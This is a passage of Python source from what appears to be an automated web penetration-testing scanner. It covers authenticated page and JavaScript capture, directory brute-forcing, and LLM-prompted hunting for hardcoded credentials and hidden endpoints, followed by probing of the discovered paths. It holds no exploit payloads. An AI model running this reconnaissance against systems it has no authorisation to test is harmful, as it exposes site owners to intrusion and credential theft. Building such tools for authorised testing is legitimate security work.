                        resp = await _pw(page.goto, cu.url, wait_until="domcontentloaded",
                                                timeout=10000, default=None)
                        if resp:
                            html = await _pw(page.content, default="")
                            # Append child-iframe HTML so <script src> + links
                            # rendered inside side iframes (common in
                            # authenticated portals) are discoverable too.
                            try:
                                for fr in (getattr(page, "frames", None) or []):
                                    if fr is getattr(page, "main_frame", None):
                                        continue
                                    fr_url = getattr(fr, "url", "") or ""
                                    if not fr_url or fr_url.startswith(("about:", "blob:", "data:")):
                                        continue
                                    try:
                                        html += "\n<!-- iframe:" + fr_url + " -->\n" + \
                                            await _pw(fr.content, default="")
                                    except Exception:
                                        continue
                            except Exception:
                                pass
                            page_sources[cu.url] = html
                except Exception:
                    pass  # skip pages that fail to load

            # --- Save page_sources to disk for the LLM-interesting route ---
            # The web UI's /api/scans/[id]/llm-interesting endpoint reads
            # this file to send page HTML to the LLM for analysis. Without
            # this file, the LLM gets "(no HTML body available)" for every
            # URL and can't find anything interesting.
            try:
                ps_path = output_dir / "page_sources.json"
                ps_path.write_text(
                    json.dumps(page_sources, indent=2, ensure_ascii=False,
                               default=str),
                    encoding="utf-8",
                )
                logger.log("page_sources_saved",
                           f"path={ps_path.name} urls={len(page_sources)}")

                # --- Collect <script src> URLs for the JavaScripts tab ---
                # Visibility feature: list every JS file the app loads so
                # the engineer can inspect them (a planted JS vuln otherwise
                # hides completely). No new network — extracts from the
                # already-captured page HTML. Absolute-izes relative URLs
                # against the page they appeared on, dedupes, and notes
                # external vs same-origin.
                try:
                    from urllib.parse import urljoin
                    script_re = re.compile(
                        r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
                    js_map: Dict[str, Dict[str, Any]] = {}
                    for src_url, html in page_sources.items():
                        for m in script_re.finditer(html or ""):
                            raw = m.group(1)
                            absu = urljoin(src_url, raw)
                            if absu in js_map:
                                # Already seen — just add this occurrence.
                                js_map[absu].setdefault("found_on", [])
                                if src_url not in js_map[absu]["found_on"]:
                                    js_map[absu]["found_on"].append(src_url)
                                continue
                            parsed_js = urlparse(absu)
                            js_host = parsed_js.hostname or ""
                            tgt_host = urlparse(args.url).hostname or ""
                            js_map[absu] = {
                                "url": absu,
                                "found_on": [src_url],
                                "external": js_host != tgt_host if js_host and tgt_host else False,
                                "filename": parsed_js.path.rsplit("/", 1)[-1] or absu,
                            }
                    # Save each SAME-ORIGIN JS source NOW, while the
                    # authenticated browser context (with the captured session
                    # cookies) is live. The "Analyze JS with AI" route runs
                    # later from Node (no cookies) and would 403 on
                    # auth-required JS — reading these saved files sidesteps
                    # that entirely. External/CDN scripts are skipped.
                    try:
                        js_source_dir = output_dir / "js_source"
                        js_source_dir.mkdir(parents=True, exist_ok=True)
                        used_names: set = set()
                        saved_count = 0
                        for absu, entry in js_map.items():
                            if entry.get("external"):
                                continue
                            if GLOBAL_STATE.stop_event.is_set():
                                break
                            try:
                                async with rate_limiter.slot():
                                    jresp = await asyncio.wait_for(
                                        page.context.request.get(absu, timeout=10000),
                                        timeout=12.0,
                                    )
                                if jresp.status >= 400:
                                    continue
                                jbody = await asyncio.wait_for(jresp.text(), timeout=5.0)
                                if not jbody or len(jbody) < 20:
                                    continue
                                stem = entry.get("filename") or "script"
                                stem = re.sub(r"[^A-Za-z0-9._-]", "_", stem) or "script"
                                if not stem.endswith(".js"):
                                    stem += ".js"
                                name = stem
                                n = 2
                                while name in used_names:
                                    name = f"{stem.rsplit('.', 1)[0]}_{n}.js"
                                    n += 1
                                used_names.add(name)
                                (js_source_dir / name).write_text(jbody, encoding="utf-8")
                                entry["local_source"] = f"js_source/{name}"
                                saved_count += 1
                            except Exception:
                                continue
                        if saved_count:
                            logger.log("javascripts_source_saved",
                                       f"saved {saved_count}/{len(js_map)} same-origin JS source files (authenticated)")
                    except Exception as e:
                        logger.log("javascripts_source_saved", f"failed: {e}")

                    js_path = output_dir / "javascripts.json"
                    js_path.write_text(
                        json.dumps(list(js_map.values()), indent=2,
                                   ensure_ascii=False, default=str),
                        encoding="utf-8",
                    )
                    logger.log("javascripts_saved",
                               f"path={js_path.name} scripts={len(js_map)}")
                except Exception as e:
                    logger.log("javascripts_save_error",
                               f"failed to save javascripts.json: {e}")
            except Exception as e:
                logger.log("page_sources_save_error",
                           f"failed to save page_sources.json: {e}")

            completed_phases.append("attack_surface")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface)
        else:
            attack_surface = GLOBAL_STATE.partial_attack_surface

        # --- Step 6.4: Interesting Locations analysis (always runs) ---
        # Flags high-value URLs + inputs for manual pentesting using
        # heuristics (admin panels, API endpoints, IDOR candidates, etc.).
        # Also runs SourceCodeAnalyzer + InputSurfaceMapper (passive).
        interesting_locations: Optional[Dict[str, Any]] = None
        if not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "analyzing interesting locations")

            # 1. Heuristic URL/param/header analysis (existing).
            il_analyzer = InterestingLocations(logger)
            interesting_locations = il_analyzer.analyze(
                crawl_map=crawl_map,
                attack_surface=attack_surface,
                header_records=header_records,
            )

            # 2. Source code analysis (NEW — passive regex scan).
            logger.log("phase", "running source code analysis")
            sc_analyzer = SourceCodeAnalyzer(logger)
            source_findings = sc_analyzer.analyze(page_sources)
            interesting_locations["source_findings"] = source_findings

            # 3. Input surface mapping (NEW — passive DOM extraction).
            # We use the page_sources (rendered DOM) for this since we
            # need the parsed DOM tree, not raw HTML.
            logger.log("phase", "running input surface mapping")
            is_mapper = InputSurfaceMapper(logger)
            input_surface: Dict[str, Any] = {}
            for cu in crawl_map[:30]:
                if not cu.in_scope:
                    continue
                if GLOBAL_STATE.stop_event.is_set():
                    break
                try:
                    async with rate_limiter.slot():
                        await _pw(page.goto, cu.url, wait_until="domcontentloaded",
                                         timeout=10000, default=None)
                        input_surface[cu.url] = await is_mapper.map_page(page, cu.url)
                except Exception:
                    pass
            interesting_locations["input_surface"] = input_surface

            # Save the enhanced interesting_locations.json.
            il_path = output_dir / "interesting_locations.json"
            il_path.write_text(
                json.dumps(interesting_locations, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("interesting_locations_saved",
                       f"path={il_path.name} "
                       f"source_findings_urls={len(source_findings)} "
                       f"input_surface_urls={len(input_surface)}")

            # --- 6.4b: Software Inventory (passive fingerprinting) ---
            logger.log("phase", "running software inventory analysis")
            si_analyzer = SoftwareInventoryAnalyzer(logger)
            software_inventory = si_analyzer.analyze(
                header_records=header_records,
                page_sources=page_sources,
            )
            si_path = output_dir / "software_inventory.json"
            si_path.write_text(
                json.dumps(software_inventory, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("software_inventory_saved",
                       f"path={si_path.name} "
                       f"items={len(software_inventory.get('items', []))}")

            # --- 6.4c: Directory Brute-forcing ---
            # Uses a bundled wordlist (bin/wordlist.txt) to try common
            # admin/config/backup paths. If the LLM is configured, it
            # reorders the wordlist based on detected technology.
            #
            # Skip on resume if already done (directory brute-force takes
            # ~20s and doesn't need to re-run).
            if "directory_bruteforce" in completed_phases:
                logger.log("phase", "RESUMED: skipping directory brute-forcing")
            elif getattr(args, "skip_dir_brute", False):
                logger.log("phase", "skipping directory brute-forcing (--skip-dir-brute)")
            else:
                logger.log("phase", "running directory brute-forcing")
                dir_findings = await _run_directory_bruteforce(
                    page, args.url, crawl_map, rate_limiter, logger, output_dir,
                    software_inventory, llm_adapter,
                    wordlist_path=Path(args.wordlist) if getattr(args, "wordlist", None) else None,
                )
                if dir_findings:
                    dir_path = output_dir / "directory_findings.json"
                    dir_path.write_text(
                        json.dumps(dir_findings, indent=2, ensure_ascii=False,
                                   default=str),
                        encoding="utf-8",
                    )
                    logger.log("directory_bruteforce_done",
                               f"found {len(dir_findings)} accessible paths")
                completed_phases.append("directory_bruteforce")
                save_scan_state(output_dir, completed_phases,
                                header_records=header_records,
                                ssl_record=ssl_record,
                                crawl_map=crawl_map,
                                attack_surface=attack_surface)

                # --- Enrich attack surface with file inputs on dir-bust pages ---
                # Directory brute-force discovers pages the crawler never
                # visited (e.g. /upload). If any 200-status page hosts a
                # <input type=file>, the FileUploadTester (which runs later
                # and iterates attack_surface) would otherwise miss it.
                # Revisit 200-status dir findings (cap 50), extract inputs,
                # and append any NEW file inputs to attack_surface.
                try:
                    existing_keys = {
                        (getattr(i, "name", ""), getattr(i, "url", ""), getattr(i, "method", ""))
                        for i in attack_surface
                    }
                    existing_urls = {getattr(c, "url", "") for c in crawl_map}
                    new_inputs: List[InputField] = []
                    new_pages_added = 0
                    new_links_added = 0
                    MAX_NEW_LINKS = 100  # bound passive's extra per-URL work
                    visited_cap = 0
                    for df in (dir_findings or []):
                        if df.get("status") != 200 or not df.get("url"):
                            continue
                        if visited_cap >= 50 or GLOBAL_STATE.stop_event.is_set():
                            break
                        visited_cap += 1
                        df_url = df["url"]
                        logger.log("directory_bruteforce_recrawl",
                                   f"visiting {visited_cap}/≤50: {df_url}")
                        try:
                            async with rate_limiter.slot():
                                await _pw(page.goto, df_url, wait_until="domcontentloaded",
                                          timeout=10000, default=None)
                                page_inputs = await surface_mapper.map_page(page, df_url)
                                # One-hop link harvest (main frame + child iframes).
                                page_links = await crawler._extract_links(page, df_url)
                                # Capture the raw HTML for this dir-brute page so
                                # page_sources consumers (Inventory AI extraction,
                                # the Interesting fallback, LLM-interesting) see it.
                                if df_url not in page_sources:
                                    page_sources[df_url] = await _pw(page.content, default="")
                        except Exception:
                            continue
                        # Add the dir-brute page itself to crawl_map so passive
                        # (per-URL error/sensitive scan) covers it.
                        if df_url not in existing_urls:
                            existing_urls.add(df_url)
                            crawl_map.append(CrawledURL(
                                url=df_url, depth=1, source="directory_bruteforce",
                                in_scope=True, method="GET"))
                            new_pages_added += 1
                        # Harvest ALL inputs (not just file) → active fuzzes them.
                        for inp in page_inputs:
                            key = (inp.name, inp.url, inp.method)
                            if key in existing_keys:
                                continue
                            existing_keys.add(key)
                            new_inputs.append(inp)
                        # Harvest in-scope links → crawl_map so passive covers
                        # them too. One hop: we do NOT then crawl these links.
                        if new_links_added < MAX_NEW_LINKS:
                            for link, tag in page_links:
                                if new_links_added >= MAX_NEW_LINKS:
                                    break
                                if not link or link in existing_urls:
                                    continue
                                try:
                                    in_scope = crawler._in_target_domain(link)
                                except Exception:
                                    in_scope = False
                                if not in_scope:
                                    continue
                                existing_urls.add(link)
                                crawl_map.append(CrawledURL(
                                    url=link, depth=2,
                                    source=f"directory_bruteforce:{tag}",
                                    in_scope=True, method="GET"))
                                new_links_added += 1
                    if new_inputs:
                        attack_surface.extend(new_inputs)
                        if attack_surface is not GLOBAL_STATE.partial_attack_surface:
                            GLOBAL_STATE.partial_attack_surface.extend(new_inputs)
                    if new_inputs or new_pages_added or new_links_added:
                        logger.log("directory_bruteforce_recrawl",
                                   f"re-crawled dir-bust pages: visited {visited_cap}, "
                                   f"+{len(new_inputs)} inputs, +{new_pages_added} pages, "
                                   f"+{new_links_added} links "
                                   f"(fed into attack_surface + crawl_map for passive/active)")
                        try:
                            (output_dir / "attack_surface.json").write_text(
                                json.dumps([asdict(i) for i in attack_surface], indent=2,
                                           ensure_ascii=False, default=str),
                                encoding="utf-8",
                            )
                        except Exception:
                            pass
                        # Rewrite crawl_map.json so the Sitemap tab (which
                        # reads it from disk) shows the additions.
                        _write_crawl_map(output_dir, crawl_map, logger)
                    # Persist page_sources additions (dir-brute pages' HTML)
                    # so the Inventory AI extraction + Interesting fallback
                    # see them.
                    try:
                        (output_dir / "page_sources.json").write_text(
                            json.dumps(page_sources, indent=2, ensure_ascii=False,
                                       default=str),
                            encoding="utf-8",
                        )
                    except Exception as _ps_e:
                        logger.log("page_sources_save",
                                   f"failed to rewrite page_sources.json: {_ps_e}")
                    # Navigate back to the target so later phases start clean.
                    try:
                        await _pw(page.goto, args.url, wait_until="domcontentloaded",
                                  timeout=15000, default=None)
                    except Exception:
                        pass
                except Exception as e:
                    logger.log("directory_bruteforce_recrawl",
                               f"attack-surface enrichment failed: {e}")

        # --- Step 6.45: LLM content analysis (if --llm-interesting) ----------
        # Re-visits EVERY in-scope crawled URL (including dir-brute-discovered
        # pages appended by the re-crawl above) with the authenticated browser
        # and asks the LLM, one page at a time, whether anything is
        # interesting (hardcoded creds, hidden endpoints, dev comments, logic
        # flaws). Unlike the post-scan web route (HTML saved for the first 30
        # pages, only the first 20 URLs analyzed), this has NO caps and uses
        # the live authenticated session. Findings stream incrementally to
        # llm_interesting_findings.json so the Interesting tab picks them up
        # automatically and an interrupted scan resumes where it stopped.
        # Cost: 1 LLM call per page — OFF by default (--llm-interesting).
        # Content-driven discovery: paths the LLM extracts from page content
        # (comments/JS/text) are PROBED afterwards (bounded, same-host GETs)
        # and recorded — see the probe pass after the per-page loop + the
        # llm_discovered_additions section of payload_manifest.json.
        llm_discovered_probes: List[Dict[str, Any]] = []
        # External/CDN scripts fetched by the Step 6.48 sweep (audit trail for
        # the payload manifest — read-only GETs to public CDN hosts).
        external_js_fetched: List[Dict[str, Any]] = []
        # External/CDN stylesheets fetched by the sweep (same audit trail).
        external_css_fetched: List[Dict[str, Any]] = []
        if "llm_content_analysis" in completed_phases:
            logger.log("phase", "RESUMED: skipping LLM content analysis")
        elif getattr(args, "llm_interesting", False) and llm_adapter.enabled \
                and not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting LLM content analysis (per-page re-crawl)")
            GLOBAL_STATE.current_phase = "llm_content_analysis"
            _lcaf_path = output_dir / "llm_interesting_findings.json"
            # Resume: keep findings already on disk + skip already-ANALYZED
            # URLs. "analyzed" is persisted separately because pages the LLM
            # returned [] for produce no findings — deriving the skip-set
            # from findings alone would re-analyze them on every resume.
            collected: List[Dict[str, Any]] = []
            analyzed_urls: Set[str] = set()
            candidate_paths: Set[str] = set()
            try:
                _lcaf_existing = json.loads(_lcaf_path.read_text(encoding="utf-8"))
                if isinstance(_lcaf_existing, dict):
                    if isinstance(_lcaf_existing.get("findings"), list):
                        collected = _lcaf_existing["findings"]
                    _lcaf_analyzed = _lcaf_existing.get("analyzed")
                    if isinstance(_lcaf_analyzed, list):
                        analyzed_urls = {str(u) for u in _lcaf_analyzed}
                    elif collected:
                        # Older saves lack "analyzed" — best-effort fallback.
                        analyzed_urls = {str(f.get("url", "")) for f in collected if isinstance(f, dict)}
            except Exception:
                pass
            char_budget = max(2000, int(getattr(args, "llm_tokens", 4000) or 4000) * 4)
            targets = [c.url for c in crawl_map
                       if getattr(c, "in_scope", True) and getattr(c, "url", "")
                       and c.url not in analyzed_urls]
            logger.log("llm_content_analysis",
                       f"{len(targets)} page(s) to analyze "
                       f"({len(analyzed_urls)} already done from a previous run)")
            new_finding_count = 0
            for _lcaf_i, _lcaf_url in enumerate(targets):
                if GLOBAL_STATE.stop_event.is_set():
                    break
                try:
                    async with rate_limiter.slot():
                        await _pw(page.goto, _lcaf_url, wait_until="domcontentloaded",
                                  timeout=10000, default=None)
                        _lcaf_html = await _pw(page.content, default="")
                    # Include child-iframe HTML (same pattern as page_sources).
                    try:
                        for fr in (getattr(page, "frames", None) or []):
                            if fr is getattr(page, "main_frame", None):
                                continue
                            fr_url = getattr(fr, "url", "") or ""
                            if not fr_url or fr_url.startswith(("about:", "blob:", "data:")):
                                continue
                            try:
                                _lcaf_html += "\n<!-- iframe:" + fr_url + " -->\n" + \
                                    await _pw(fr.content, default="")
                            except Exception:
                                continue
                    except Exception:
                        pass
                    if not _lcaf_html or len(_lcaf_html) < 50:
                        continue
                    # Free source capture: the HTML is already in hand (the
                    # truncated copy below is only for the LLM prompt) — store
                    # the FULL copy so the Step 6.48 sweep / Inventory AI see
                    # this page without re-fetching it.
                    if _lcaf_url not in page_sources:
                        page_sources[_lcaf_url] = _lcaf_html
                    if len(_lcaf_html) > char_budget:
                        _lcaf_html = _lcaf_html[:char_budget] + "\n...[truncated]"
                    _lcaf_prompt = (
                        "You are a web security analyst. Review this page source "
                        "(HTML + inline JS) and identify anything interesting for a "
                        "pentester:\n"
                        "1. Hardcoded credentials or API keys.\n"
                        "2. Hidden API endpoints or fetch/XHR calls not linked in the HTML.\n"
                        "3. Developer comments (TODO, FIXME, DEBUG, SECURITY).\n"
                        "4. Potential logic flaws based on the structure.\n"
                        "5. Anything else a pentester should manually check.\n\n"
                        f"PAGE URL: {_lcaf_url}\n\n"
                        f"PAGE SOURCE:\n{_lcaf_html}\n\n"
                        "Respond with ONLY a JSON array (no markdown, no preamble): "
                        '[{"title": "...", "reason": "...", "suggested_test": "...", '
                        '"paths": ["/new/path", ...]}]. '
                        '"paths" = any NEW same-site paths/endpoints referenced in '
                        "this page's content (comments, JS, forms, page text) that "
                        "are worth probing and are NOT among the visible links — "
                        "omit the field if none. Return [] if nothing is interesting."
                    )
                    _lcaf_raw = await llm_adapter._call_endpoint(
                        _lcaf_prompt,
                        system=("You are a web security analyst reviewing ONE page. "
                                "You output ONLY a JSON array — no prose, no markdown "
                                "fences, no preamble."),
                    )
                    if _lcaf_raw and _lcaf_raw.strip():
                        _lcaf_text = _strip_think_tags(_lcaf_raw).strip()
                        if _lcaf_text.startswith("```"):
                            _lcaf_lines = _lcaf_text.split("\n")
                            if _lcaf_lines and _lcaf_lines[0].startswith("```"):
                                _lcaf_lines = _lcaf_lines[1:]
                            if _lcaf_lines and _lcaf_lines[-1].strip() == "```":
                                _lcaf_lines = _lcaf_lines[:-1]
                            _lcaf_text = "\n".join(_lcaf_lines)
                        _s = _lcaf_text.find("[")
                        _e = _lcaf_text.rfind("]")
                        if _s != -1 and _e > _s:
                            try:
                                _lcaf_arr = json.loads(_lcaf_text[_s:_e + 1])
                            except Exception:
                                _lcaf_arr = []
                            if isinstance(_lcaf_arr, list):
                                for item in _lcaf_arr:
                                    if not isinstance(item, dict):
                                        continue
                                    _item_paths = item.get("paths")
                                    if isinstance(_item_paths, list):
                                        for _cp in _item_paths:
                                            if isinstance(_cp, str) and _cp.strip():
                                                candidate_paths.add(_cp.strip())
                                    if item.get("title"):
                                        collected.append({
                                            "title": str(item.get("title", "")),
                                            "reason": str(item.get("reason", "")),
                                            "suggested_test": str(item.get("suggested_test", "")),
                                            "url": _lcaf_url,
                                        })
                                        new_finding_count += 1
                    # Mark analyzed (even when the LLM returned []) so a
                    # resume doesn't repeat this page.
                    analyzed_urls.add(_lcaf_url)
                    # Incremental write (tmp + rename) so partial results
                    # survive interruption and the UI can pick them up live.
                    try:
                        _lcaf_tmp = output_dir / "llm_interesting_findings.json.tmp"
                        _lcaf_tmp.write_text(
                            json.dumps({"findings": collected,
                                        "analyzed": sorted(analyzed_urls)}, indent=2,
                                       ensure_ascii=False, default=str),
                            encoding="utf-8")
                        _lcaf_tmp.replace(_lcaf_path)
                    except Exception:
                        pass
                    if (_lcaf_i + 1) % 5 == 0 or _lcaf_i + 1 == len(targets):
                        logger.log("llm_content_analysis",
                                   f"progress: {_lcaf_i + 1}/{len(targets)} pages, "
                                   f"{new_finding_count} new finding(s)")
                except Exception as _lcaf_ex:
                    logger.log("llm_content_analysis",
                               f"page failed ({_lcaf_url}): {type(_lcaf_ex).__name__}: {_lcaf_ex}")
                    continue

            # --- Content-driven discovery: probe the LLM-found paths ---------
            # The per-page analysis extracted same-site paths referenced in
            # comments/JS/text that aren't in the wordlist. Probe them like
            # directory brute-force would (GET, same host, rate-limited),
            # record hits in directory_findings.json under base
            # "(llm-discovered)", feed 200s into crawl_map (passive runs
            # next), and log every probe into llm_discovered_probes for the
            # payload manifest. Bounded to 20 new paths.
            try:
                _tgt_parsed = urlparse(args.url)
                _tgt_origin = f"{_tgt_parsed.scheme}://{_tgt_parsed.netloc}"
                _tgt_host = (_tgt_parsed.hostname or "").lower()
                _known_paths: Set[str] = set()
                for cu in crawl_map:
                    try:
                        _known_paths.add(urlparse(getattr(cu, "url", "")).path or "/")
                    except Exception:
                        pass
                _dirf_path = output_dir / "directory_findings.json"
                _dirf_rows: List[Dict[str, Any]] = []
                try:
                    _dirf_rows = json.loads(_dirf_path.read_text(encoding="utf-8"))
                    if not isinstance(_dirf_rows, list):
                        _dirf_rows = []
                except Exception:
                    _dirf_rows = []
                for _df in _dirf_rows:
                    try:
                        _known_paths.add(urlparse(str(_df.get("url", ""))).path or "/")
                    except Exception:
                        pass
                _probe_targets: List[str] = []
                for _cp in sorted(candidate_paths):
                    if len(_probe_targets) >= 20:
                        break
                    if _cp.startswith(("http://", "https://")):
                        try:
                            _pu = urlparse(_cp)
                            if (_pu.hostname or "").lower() != _tgt_host:
                                continue  # off-target — skip
                            _cp_path = _pu.path or "/"
                        except Exception:
                            continue
                    else:
                        _cp_path = _cp if _cp.startswith("/") else "/" + _cp
                        _cp_path = _cp_path.split("?")[0].split("#")[0]
                    if not _cp_path.startswith("/") or _cp_path == "/" or _cp_path in _known_paths:
                        continue
                    _known_paths.add(_cp_path)
                    _probe_targets.append(_cp_path)
                if _probe_targets:
                    logger.log("llm_discovered_paths",
                               f"probing {len(_probe_targets)} LLM-discovered path(s): "
                               + ", ".join(_probe_targets[:10]))
                for _cp_path in _probe_targets:
                    if GLOBAL_STATE.stop_event.is_set():
                        break
                    _cp_url = urljoin(_tgt_origin + "/", _cp_path.lstrip("/"))
                    try:
                        async with rate_limiter.slot():
                            _cp_resp = await asyncio.wait_for(
                                page.context.request.fetch(_cp_url, method="GET",
                                                           max_redirects=3, timeout=8000),
                                timeout=10.0,
                            )
                        _cp_status = _cp_resp.status
                        if _cp_status in (200, 301, 302, 401, 403):
                            _cp_title = ""
                            try:
                                _cp_body = await asyncio.wait_for(_cp_resp.text(), timeout=3.0)
                                _cp_tm = re.search(r"<title[^>]*>([^<]*)</title>",
                                                   _cp_body, re.IGNORECASE)
                                if _cp_tm:
                                    _cp_title = _cp_tm.group(1).strip()
                            except Exception:
                                pass
                            _dirf_rows.append({
                                "base": "(llm-discovered)",
                                "path": _cp_path,
                                "url": _cp_url,
                                "status": _cp_status,
                                "title": _cp_title[:200],
                                "note": ("Path exists (200)" if _cp_status == 200
                                         else f"Redirect ({_cp_status})" if _cp_status in (301, 302)
                                         else f"Auth required ({_cp_status})"),
                            })
                            if _cp_status == 200:
                                crawl_map.append(CrawledURL(
                                    url=_cp_url, depth=2, source="llm_discovered",
                                    in_scope=True, method="GET"))
                            logger.log("llm_discovered_path_found",
                                       f"path={_cp_path} status={_cp_status}")
                        llm_discovered_probes.append({
                            "path": _cp_path, "status": _cp_status,
                            "found_via": "AI content analysis (comments/JS/text)",
                        })
                    except Exception:
                        continue
                if llm_discovered_probes:
                    try:
                        _dirf_path.write_text(
                            json.dumps(_dirf_rows, indent=2, ensure_ascii=False,
                                       default=str),
                            encoding="utf-8")
                    except Exception:
                        pass
                        # Persist any 200s appended to crawl_map (Sitemap tab).
                        if any(getattr(c, "source", "") == "llm_discovered" for c in crawl_map):
                            _write_crawl_map(output_dir, crawl_map, logger)
                    logger.log("llm_discovered_paths",
                               f"{len(llm_discovered_probes)} LLM-discovered path(s) probed, "
                               f"{sum(1 for p in llm_discovered_probes if p.get('status') == 200)} "
                               f"returned 200")
            except Exception as e:
                logger.log("llm_discovered_paths", f"probe pass failed: {e}")
            # Navigate back so later phases start clean.
            try:
                await _pw(page.goto, args.url, wait_until="domcontentloaded",
                          timeout=15000, default=None)
            except Exception:
                pass
            logger.log("phase",
                       f"LLM content analysis complete: {len(targets)} page(s) "
                       f"analyzed, {new_finding_count} new finding(s), "
                       f"{len(collected)} total in llm_interesting_findings.json")
            completed_phases.append("llm_content_analysis")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface)

        # --- Step 6.47: re-run heuristic Interesting Locations on the
        # AUGMENTED crawl_map + attack_surface (always runs — pure regex, no
        # LLM, ~free). The original Step 6.4 run happened BEFORE directory
        # brute-forcing, so dir-brute-discovered URLs/params/inputs were never
        # flagged. Merge recomputed keys into interesting_locations.json,
        # preserving the source_findings/input_surface keys.
        if interesting_locations is not None and not GLOBAL_STATE.stop_event.is_set():
            try:
                _il_rerun = InterestingLocations(logger).analyze(
                    crawl_map=crawl_map,
                    attack_surface=attack_surface,
                    header_records=header_records,
                )
                _il_path = output_dir / "interesting_locations.json"
                _il_merged: Dict[str, Any] = {}
                try:
                    _il_loaded = json.loads(_il_path.read_text(encoding="utf-8"))
                    if isinstance(_il_loaded, dict):
                        _il_merged = _il_loaded
                except Exception:
                    _il_merged = {}
                for _k, _v in (_il_rerun or {}).items():
                    if isinstance(_v, list):
                        _seen = {(f.get("where"), f.get("category"))
                                 for f in _il_merged.get(_k, []) if isinstance(f, dict)}
                        for f in _v:
                            if isinstance(f, dict) and (f.get("where"), f.get("category")) not in _seen:
                                _seen.add((f.get("where"), f.get("category")))
                                _il_merged.setdefault(_k, []).append(f)
                    else:
                        _il_merged[_k] = _v
                _il_path.write_text(
                    json.dumps(_il_merged, indent=2, ensure_ascii=False, default=str),
                    encoding="utf-8")
                interesting_locations = _il_merged
                logger.log("interesting_locations_rerun",
                           f"re-ran on augmented crawl map ({len(crawl_map)} URLs, "
                           f"{len(attack_surface)} inputs)")
            except Exception as e:
                logger.log("interesting_locations_rerun", f"failed: {e}")

        # --- Step 6.48: Sitemap source sweep (always runs) --------------------
        # The FINAL sitemap is now complete (crawl + dir-brute re-crawl + LLM
        # discovery). Earlier source capture covered only the first 60 crawled
        # pages (+ dir-brute pages + anything Step 6.45 grabbed for free), so
        # the Inventory (regex + AI) missed everything else. This sweep visits
        # every remaining in-scope sitemap URL on the AUTHENTICATED browser
        # context, captures its HTML (+ iframes) into page_sources, and
        # collects its <script src> files — same-host (authenticated) AND
        # external/CDN (plain GET, cap ~50; versions love living in CDN paths
        # like /npm/jquery@3.6.0/). The regex software inventory is then
        # REBUILT over the full page set so both inventory passes cover the
        # whole sitemap.
        # Honest limits: the sitemap is what the scan DISCOVERED — pages behind
        # unexecuted JS, modal/param-only pages, and 401/403 dir-brute pages
        # are not in it and cannot be swept.
        if not GLOBAL_STATE.stop_event.is_set():
            try:
                _sweep_targets = [c.url for c in crawl_map
                                  if getattr(c, "in_scope", True)
                                  and getattr(c, "url", "")
                                  and c.url not in page_sources]
                _sweep_done = 0
                _sweep_new = 0
                logger.log("sitemap_sweep",
                           f"{len(_sweep_targets)} sitemap URL(s) not yet captured "
                           f"(of {len(crawl_map)} total; capturing now, authenticated)")
                for _sw_url in _sweep_targets:
                    if GLOBAL_STATE.stop_event.is_set():
                        break
                    try:
                        async with rate_limiter.slot():
                            await _pw(page.goto, _sw_url, wait_until="domcontentloaded",
                                      timeout=10000, default=None)
                            _sw_html = await _pw(page.content, default="")
                        # Include child-iframe HTML (same pattern as capture loop).
                        try:
                            for fr in (getattr(page, "frames", None) or []):
                                if fr is getattr(page, "main_frame", None):
                                    continue
                                fr_url = getattr(fr, "url", "") or ""
                                if not fr_url or fr_url.startswith(("about:", "blob:", "data:")):
                                    continue
                                try:
                                    _sw_html += "\n<!-- iframe:" + fr_url + " -->\n" + \
                                        await _pw(fr.content, default="")
                                except Exception:
                                    continue
                        except Exception:
                            pass
                        _sweep_done += 1
                        if _sw_html and len(_sw_html) >= 50:
                            page_sources[_sw_url] = _sw_html
                            _sweep_new += 1
                        if _sweep_done % 5 == 0 or _sweep_done == len(_sweep_targets):
                            logger.log("sitemap_sweep",
                                       f"progress: {_sweep_done}/{len(_sweep_targets)} "
                                       f"pages captured")
                    except Exception:
                        continue
                # Navigate back so later phases start clean.
                try:
                    await _pw(page.goto, args.url, wait_until="domcontentloaded",
                              timeout=15000, default=None)
                except Exception:
                    pass
                logger.log("sitemap_sweep",
                           f"pages: {_sweep_new} new capture(s) of "
                           f"{len(_sweep_targets)} target(s); page_sources now "
                           f"{len(page_sources)} URL(s)")

                # --- JS collection over the FULL page set (incl. external) ---
                # Re-extract <script src> from every page (new ones included),
                # fetch scripts not yet saved: same-host authenticated via the
                # browser context; external/CDN via plain GET (cap 50) so
                # version fingerprints in CDN paths/files reach the AI pass.
                _tgt_host_sw = (urlparse(args.url).hostname or "").lower()
                _js_path_sw = output_dir / "javascripts.json"
                _js_entries_sw: List[Dict[str, Any]] = []
                try:
                    _loaded_js = json.loads(_js_path_sw.read_text(encoding="utf-8"))
                    if isinstance(_loaded_js, list):
                        _js_entries_sw = _loaded_js
                except Exception:
                    _js_entries_sw = []
                _known_js_urls = {str(e.get("url", "")) for e in _js_entries_sw
                                  if isinstance(e, dict)}
                # Collect candidate script URLs from ALL page HTML.
                _script_re_sw = re.compile(
                    r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
                _cand_js: Dict[str, Dict[str, Any]] = {}
                for _src_url_sw, _html_sw in page_sources.items():
                    for _m_sw in _script_re_sw.finditer(_html_sw or ""):
                        try:
                            _abs_sw = urljoin(_src_url_sw, _m_sw.group(1))
                        except Exception:
                            continue
                        if _abs_sw in _known_js_urls or _abs_sw in _cand_js:
                            if _abs_sw in _cand_js:
                                if _src_url_sw not in _cand_js[_abs_sw]["found_on"]:
                                    _cand_js[_abs_sw]["found_on"].append(_src_url_sw)
                            continue
                        _pu_sw = urlparse(_abs_sw)
                        _js_host_sw = (_pu_sw.hostname or "").lower()
                        _cand_js[_abs_sw] = {
                            "url": _abs_sw,
                            "found_on": [_src_url_sw],
                            "external": bool(_js_host_sw and _tgt_host_sw
                                             and _js_host_sw != _tgt_host_sw),
                            "filename": _pu_sw.path.rsplit("/", 1)[-1] or _abs_sw,
                        }
                _saved_same = 0
                _saved_ext = 0
                _ext_seen = 0
                _js_dir_sw = output_dir / "js_source"
                _js_dir_sw.mkdir(parents=True, exist_ok=True)
                _used_names_sw: set = set()
                for _e_sw in _js_entries_sw:
